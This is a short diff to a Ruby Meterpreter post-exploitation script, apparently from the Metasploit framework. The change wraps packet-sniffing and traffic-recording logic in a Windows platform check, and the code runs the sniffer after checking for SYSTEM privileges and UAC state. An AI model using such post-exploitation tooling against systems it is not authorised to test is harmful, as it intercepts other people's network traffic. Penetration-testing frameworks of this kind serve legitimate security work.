@@ -146,29 +146,34 @@ end
 helpcall = 0
 intid = 0
 background = 0
-@@exec_opts.parse(args) { |opt, idx, val|
-	case opt
-	when "-t"
-		packtime = val
-	when "-i"
-		intid = val.to_i
-	when "-h"
-		helpmsg
-		helpcall = 1
-	end
-}
-if helpcall == 0
-	if (user != "NT AUTHORITY\\SYSTEM") && intid != 0
-		if not checkuac(session)
+if client.platform =~ /win32|win64/
+	@@exec_opts.parse(args) { |opt, idx, val|
+		case opt
+		when "-t"
+			packtime = val
+		when "-i"
+			intid = val.to_i
+		when "-h"
+			helpmsg
+			helpcall = 1
+		end
+	}
+	if helpcall == 0
+		if (user != "NT AUTHORITY\\SYSTEM") && intid != 0
+			if not checkuac(session)
+				startsniff(session,intid)
+				packetrecord(session,packtime,logfile,intid)
+			else
+				print_line("[-] The Meterpreter process is not running as System and UAC is not enable, Insufficient Privileges to run")
+			end
+		elsif intid != 0
 			startsniff(session,intid)
 			packetrecord(session,packtime,logfile,intid)
-		else 
-			print_line("[-] The Meterpreter process is not running as System and UAC is not enable, Insufficient Privileges to run")
+		else
+			helpmsg
 		end
-	elsif intid != 0
-		startsniff(session,intid)
-		packetrecord(session,packtime,logfile,intid)
-	else
-		helpmsg
 	end
+else
+	print_error("This version of Meterpreter is not supported with this Script!")
+	raise Rex::Script::Completed
 end
